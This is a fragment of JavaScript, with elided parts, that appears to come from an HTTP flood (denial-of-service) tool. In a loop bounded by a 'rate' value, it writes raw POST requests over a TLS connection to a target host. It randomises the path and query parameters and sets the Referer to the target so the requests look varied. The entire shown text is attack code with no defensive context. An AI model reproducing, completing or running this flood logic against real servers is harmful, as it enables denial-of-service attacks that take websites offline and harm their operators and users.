            ...
            function () {
              for (let j = 0; j < rate; j++) {
                tlsConnection.write(
                  "POST" +
                    " " +
                    `${parsed.path.replace("%RAND%", ra())}?${randomparam}=${randstr.generate({ length: 12, charset: "ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789" })}` +
                    " HTTP/1.1\r\nHost: " +
                    parsed.host +
                    "\r\nReferer: " +
                    target +
                    ...
                    `${headerbuilders !== undefined ? headerbuilders.replace("%RAND%", ra()) : ""}` +
                    "\r\n\r\n" +
